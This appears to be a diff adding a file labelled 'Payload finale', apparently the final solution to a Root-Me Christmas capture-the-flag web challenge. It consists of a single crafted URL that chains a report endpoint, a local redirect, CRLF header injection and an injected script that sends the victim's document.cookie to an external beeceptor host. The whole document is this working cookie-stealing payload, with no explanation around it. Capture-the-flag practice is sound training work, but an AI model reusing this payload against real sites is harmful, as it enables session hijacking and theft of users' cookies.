@@ -1,0 +1,3 @@
+Payload finale :
+
+http://dyn-01.xmas.root-me.org:27823/api/report?url=http://127.0.0.1:3000/api/redirect?url=resource://spikeroot.free.beeceptor.com%250D%250AConnection:%20close%250D%250A%250D%250A%3Cscript%3Ewindow.location=%27https://spikeroot.free.beeceptor.com/?cookie=%27%252Bdocument.cookie%3C/script%3E
